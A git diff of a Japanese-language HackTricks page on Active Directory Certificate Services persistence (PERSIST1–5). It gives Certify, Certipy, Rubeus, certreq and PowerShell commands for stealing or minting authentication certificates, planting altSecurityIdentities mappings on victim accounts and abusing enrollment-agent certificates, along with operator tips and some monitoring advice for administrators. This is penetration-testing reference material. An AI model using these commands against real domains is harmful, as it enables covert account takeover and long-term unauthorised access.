@@ -2,55 +2,131 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**これは、[https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)の素晴らしい研究のマシン持続性章の小さな要約です。**
+**これは、[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) の素晴らしい研究のアカウント持続性章の小さな要約です。**
 
-## **証明書を使用したアクティブユーザー資格情報の盗難の理解 – PERSIST1**
+## 証明書を使用したアクティブユーザー資格情報の盗難の理解 – PERSIST1
 
-ユーザーがドメイン認証を許可する証明書を要求できるシナリオでは、攻撃者はこの証明書を**要求**し、**盗む**機会を得て、ネットワーク上で**持続性**を維持することができます。デフォルトでは、Active Directoryの`User`テンプレートはそのような要求を許可しますが、場合によっては無効にされることがあります。
+ユーザーがドメイン認証を許可する証明書を要求できるシナリオでは、攻撃者はこの証明書を要求して盗む機会を得て、ネットワーク上で持続性を維持することができます。デフォルトでは、Active Directoryの `User` テンプレートはそのような要求を許可しますが、場合によっては無効にされることがあります。
 
-[**Certify**](https://github.com/GhostPack/Certify)というツールを使用すると、持続的なアクセスを可能にする有効な証明書を検索できます：
+[Certify](https://github.com/GhostPack/Certify) または [Certipy](https://github.com/ly4k/Certipy) を使用して、クライアント認証を許可する有効なテンプレートを検索し、その後1つを要求できます：
 ```bash
+# Enumerate client-auth capable templates
 Certify.exe find /clientauth
-```
-証明書の力は、その証明書が属する**ユーザーとして認証する**能力にあることが強調されています。パスワードの変更に関係なく、証明書が**有効**である限りです。
 
-証明書は、`certmgr.msc`を使用したグラフィカルインターフェースまたは`certreq.exe`を使用したコマンドラインを通じて要求できます。**Certify**を使用すると、証明書を要求するプロセスは次のように簡素化されます:
-```bash
-Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME
+# Request a user cert from an Enterprise CA (current user context)
+Certify.exe request /ca:CA-SERVER\CA-NAME /template:User
+
+# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
+certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
 ```
-成功したリクエストにより、証明書とその秘密鍵が `.pem` 形式で生成されます。これをWindowsシステムで使用可能な `.pfx` ファイルに変換するには、次のコマンドが使用されます：
+証明書の力は、それが属するユーザーとして認証する能力にあります。パスワードが変更されても、証明書が有効である限り、その能力は変わりません。
+
+PEMをPFXに変換し、それを使用してTGTを取得できます:
 ```bash
+# Convert PEM returned by Certify to PFX
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-```
-`.pfx`ファイルはターゲットシステムにアップロードされ、[**Rubeus**](https://github.com/GhostPack/Rubeus)というツールを使用してユーザーのチケットグラントチケット（TGT）を要求するために使用され、攻撃者のアクセスを証明書が**有効**である限り（通常は1年）延長します：
-```bash
-Rubeus.exe asktgt /user:harmj0y /certificate:C:\Temp\cert.pfx /password:CertPass!
-```
-重要な警告として、この技術が**THEFT5**セクションで概説されている別の方法と組み合わさることで、攻撃者がローカルセキュリティ認証局サブシステムサービス（LSASS）と対話することなく、非特権コンテキストからアカウントの**NTLMハッシュ**を持続的に取得できることが示されています。これにより、長期的な資格情報の窃盗に対してよりステルスな方法が提供されます。
 
-## **証明書を使用したマシンの持続性の獲得 - PERSIST2**
+# Use certificate for PKINIT and inject the TGT
+Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt
 
-別の方法は、妥協されたシステムのマシンアカウントを証明書に登録することを含み、デフォルトの`Machine`テンプレートを利用してそのようなアクションを許可します。攻撃者がシステム上で特権を取得した場合、**SYSTEM**アカウントを使用して証明書を要求でき、**持続性**の一形態を提供します。
+# Or with Certipy
+certipy auth -pfx user.pfx -dc-ip 10.0.0.10
+```
+> 注: 他の技術と組み合わせることで（THEFTセクションを参照）、証明書ベースの認証はLSASSに触れることなく、さらには非特権コンテキストからも持続的なアクセスを可能にします。
+
+## 証明書を使用したマシンの持続性の獲得 - PERSIST2
+
+攻撃者がホスト上で特権を持っている場合、彼らはデフォルトの`Machine`テンプレートを使用して、侵害されたシステムのマシンアカウントに対して証明書を登録できます。マシンとして認証することで、ローカルサービスのためのS4U2Selfが有効になり、持続的なホストの持続性を提供することができます:
 ```bash
+# Request a machine certificate as SYSTEM
 Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine
+
+# Authenticate as the machine using the issued PFX
+Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
 ```
-このアクセスにより、攻撃者はマシンアカウントとして**Kerberos**に認証し、**S4U2Self**を利用してホスト上の任意のサービスのKerberosサービスチケットを取得でき、実質的に攻撃者にマシンへの持続的なアクセスを付与します。
+## Extending Persistence Through Certificate Renewal - PERSIST3
 
-## **証明書の更新による持続性の拡張 - PERSIST3**
+証明書テンプレートの有効期限と更新期間を悪用することで、攻撃者は長期的なアクセスを維持できます。以前に発行された証明書とその秘密鍵を持っている場合、期限切れの前にそれを更新することで、元の主体に関連付けられた追加のリクエストアーティファクトを残さずに、新しい長期的な資格情報を取得できます。
+```bash
+# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
+# Provide the existing PFX and target the same CA/template when possible
+certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
+-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx
 
-最後に議論される方法は、証明書テンプレートの**有効性**と**更新期間**を利用することです。証明書の有効期限前に**更新**することで、攻撃者は追加のチケット登録を必要とせずにActive Directoryへの認証を維持でき、これは証明書認証局（CA）サーバーに痕跡を残す可能性があります。
+# Native Windows renewal with certreq
+# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
+certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
+```
+> 操作のヒント: 攻撃者が保持するPFXファイルの有効期限を追跡し、早めに更新してください。更新により、最新のSIDマッピング拡張が含まれるようになり、厳格なDCマッピングルールの下でも使用可能になります（次のセクションを参照）。
 
-### Certify 2.0による証明書の更新
+## 明示的な証明書マッピングの植え付け (altSecurityIdentities) – PERSIST4
 
-**Certify 2.0**から、更新ワークフローは新しい`request-renew`コマンドを通じて完全に自動化されています。以前に発行された証明書（**base-64 PKCS#12**形式）を用いることで、攻撃者は元の所有者と対話することなくそれを更新でき、隠密で長期的な持続性に最適です。
+ターゲットアカウントの`altSecurityIdentities`属性に書き込むことができれば、攻撃者が制御する証明書をそのアカウントに明示的にマッピングできます。これはパスワード変更を超えて持続し、強力なマッピング形式を使用する場合、最新のDC強制の下でも機能し続けます。
+
+高レベルのフロー:
+
+1. 自分が制御するクライアント認証証明書を取得または発行します（例: 自分自身として`User`テンプレートに登録）。
+2. 証明書から強力な識別子を抽出します（Issuer+Serial、SKI、またはSHA1-PublicKey）。
+3. その識別子を使用して、被害者のプリンシパルの`altSecurityIdentities`に明示的なマッピングを追加します。
+4. あなたの証明書で認証します; DCはそれを明示的なマッピングを介して被害者にマッピングします。
+
+例 (PowerShell) 強力なIssuer+Serialマッピングを使用:
 ```powershell
-Certify.exe request-renew --ca SERVER\\CA-NAME \
---cert-pfx MIACAQMwgAYJKoZIhvcNAQcBoIAkgA...   # original PFX
+# Example values - reverse the issuer DN and serial as required by AD mapping format
+$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
+$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
+$Map     = "X509:<I>$Issuer<SR>$SerialR"
+
+# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
+Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 ```
-コマンドは、新しいフルライフタイム期間に対して有効な新しいPFXを返します。これにより、最初の証明書が期限切れまたは取り消された後でも、認証を続けることができます。
+その後、PFXで認証します。Certipyは直接TGTを取得します：
+```bash
+certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
+```
+ノート
+- 強いマッピングタイプのみを使用する: X509IssuerSerialNumber, X509SKI, または X509SHA1PublicKey。弱い形式（Subject/Issuer, Subject-only, RFC822 email）は非推奨であり、DCポリシーによってブロックされる可能性があります。
+- 証明書チェーンは、DCによって信頼されるルートに構築される必要があります。NTAuthのエンタープライズCAは通常信頼されており、一部の環境では公開CAも信頼されています。
+
+弱い明示的マッピングと攻撃経路についての詳細は、以下を参照してください:
+
+{{#ref}}
+domain-escalation.md
+{{#endref}}
+
+## エンロールメントエージェントを使用した持続性 – PERSIST5
+
+有効な証明書要求エージェント/エンロールメントエージェント証明書を取得すると、ユーザーの代わりに新しいログオン可能な証明書を自由に発行でき、エージェントPFXをオフラインで持続性トークンとして保持できます。悪用ワークフロー:
+```bash
+# Request an Enrollment Agent cert (requires template rights)
+Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"
+
+# Mint a user cert on behalf of another principal using the agent PFX
+Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
+/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass
+
+# Or with Certipy
+certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
+-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
+```
+エージェント証明書またはテンプレートの権限の取り消しが、この持続性を排除するために必要です。
+
+## 2025年の強力な証明書マッピングの強制: 持続性への影響
+
+Microsoft KB5014754は、ドメインコントローラーにおける強力な証明書マッピングの強制を導入しました。2025年2月11日以降、DCはデフォルトで完全な強制に切り替わり、弱い/あいまいなマッピングを拒否します。実際の影響:
+
+- SIDマッピング拡張がない2022年以前の証明書は、DCが完全な強制にある場合、暗黙のマッピングに失敗する可能性があります。攻撃者は、AD CSを通じて証明書を更新してSID拡張を取得するか、`altSecurityIdentities`に強力な明示的マッピングを植え付けることでアクセスを維持できます（PERSIST4）。
+- 強力な形式（Issuer+Serial、SKI、SHA1-PublicKey）を使用した明示的マッピングは引き続き機能します。弱い形式（Issuer/Subject、Subject-only、RFC822）はブロックされる可能性があり、持続性のためには避けるべきです。
+
+管理者は以下を監視し、警告を出すべきです:
+- `altSecurityIdentities`の変更およびエンロールメントエージェントとユーザー証明書の発行/更新。
+- 代理リクエストおよび異常な更新パターンのためのCA発行ログ。
 
 ## 参考文献
 
-- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
+- Microsoft. KB5014754: Windowsドメインコントローラーにおける証明書ベースの認証の変更（強制タイムラインと強力なマッピング）。
+https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
+- Certipy Wiki – コマンドリファレンス（`req -renew`、`auth`、`shadow`）。
+https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
 
 {{#include ../../../banners/hacktricks-training.md}}
